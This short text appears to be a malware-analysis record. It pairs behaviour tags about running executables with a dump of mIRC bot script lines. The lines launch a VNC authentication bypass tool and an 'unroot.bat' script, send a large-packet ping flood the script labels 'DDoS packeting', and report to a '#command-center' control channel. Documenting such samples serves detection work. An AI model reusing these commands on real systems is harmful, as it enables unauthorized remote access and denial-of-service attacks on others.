behavior.run: May run an executable file or a system command
behavior.system: May run an executable file or a system command on a Mac

dump: | timervnc off | run proc.exe vnc_bypauth.exe | exit | run $mircdir $+ servicerun.exe unroot.bat }
run servicerun.exe "ping.exe $2 -n $3 -l 65500" | msg $nick DDoS packeting $2 with $calc($3 *65536/1024/1000) $+ mb traffic
if ($2 != helpme) { msg $nick Permission Denied | msg #command-center Blow: Attempt Key Change By $nick Failed. | halt }
